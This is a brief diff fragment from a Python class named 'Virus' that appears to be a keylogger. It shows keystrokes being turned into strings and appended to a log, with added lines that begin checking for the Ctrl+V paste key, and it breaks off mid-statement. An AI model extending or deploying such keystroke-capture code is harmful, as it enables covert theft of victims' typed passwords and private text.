@@ -95,3 +95,5 @@ class Virus(object):
                     keystr = f"\x00<^{chr(key.vk)}>\x00"
 
                 self.append_text(keystr)
+
+                if key.char.encode() == b"\x16":
